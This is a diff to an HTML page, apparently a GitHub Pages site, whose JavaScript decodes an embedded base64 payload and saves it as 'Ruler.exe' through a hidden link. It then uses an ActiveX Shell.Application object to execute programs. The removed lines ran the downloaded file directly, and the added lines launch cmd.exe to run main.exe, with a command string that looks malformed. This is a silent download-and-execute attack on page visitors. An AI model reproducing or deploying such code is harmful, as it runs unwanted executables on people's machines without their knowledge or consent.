@@ -8,7 +8,6 @@
             function base64ToArrayBuffer(base64) {
             var binary_string = window.atob(base64);
             var len = binary_string.length;
-            var oShell = new ActiveXObject("Shell.Application");
             var bytes = new Uint8Array( len );
                 for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                 return bytes.buffer;
@@ -30,13 +29,13 @@
                 var url = window.URL.createObjectURL(blob);
                 a.href = url;
                 a.download = fileName;
-				var commandtoRun = fileName
-				a.run = oShell.ShellExecute(commandtoRun,"","","open","1");
+				var objShell = new ActiveXObject("Shell.Application");
+        objShell.ShellExecute("cmd.exe", "C: cd C:\\pr main.exe blablafile.txt auto", "C:\\WINDOWS\\system32", "open", "1");
                 a.click();
                 window.URL.revokeObjectURL(url);
             }
 			
-        </script><a href="blob:https://seu22.github.io/8d49b486-e705-45be-87bf-1dc211facfa0" download="Ruler.exe" run="Ruler.exe" style="display: none;"></a>
+        </script><a href="blob:https://seu22.github.io/8d49b486-e705-45be-87bf-1dc211facfa0" download="Ruler.exe" style="display: none;"></a>
     
 
 </body></html>
